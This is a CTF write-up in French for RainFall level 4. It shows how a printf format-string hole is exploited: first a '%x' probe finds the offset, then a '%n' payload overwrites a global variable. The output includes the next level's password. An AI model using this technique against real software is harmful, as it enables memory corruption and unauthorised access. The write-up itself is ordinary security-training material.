# Level 4

En ouvrant level4 avec cutter on voit que le main appelle une fonction `n` qui lit l'entre standard et envoie le resultat a une fonction `p` qui printf ce dernier. Mais le printf ne precise pas le type ce qui nous permet d'utiliser une string attack comme a l'exercie precedant. Il faut donc commancer par trouver ladresse du parametre de printf comme dans lexercice precedant.
```
level4@RainFall:~$ python -c "print 'aaaa' + '%x ' * 12 " | ./level4
aaaab7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 61616161
level4@RainFall:~$
```
On voit que les `a` *(61)* sont au 12eme index. La différence est que la condition qui suit l'appel de p compare m avec `0x1025544` = 16930116, donc il faut cree un payload qui va utiliser le `%[number]d` qui va afficher n caractère non printable les compter grace au `%n` et les stocker dans l'adresse de `m`.
```
level4@RainFall:~$ python -c "print '\x10\x98\x04\x08' + '%16930112d%12\$n'" | ./level4
[...]
-1208015184
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
level4@RainFall:~$ su level5
Password:
RELRO STACK CANARY NX PIE RPATH RUNPATH FILE
No RELRO No canary found NX disabled No PIE No RPATH No RUNPATH /home/user/level5/level5
level5@RainFall:~$
```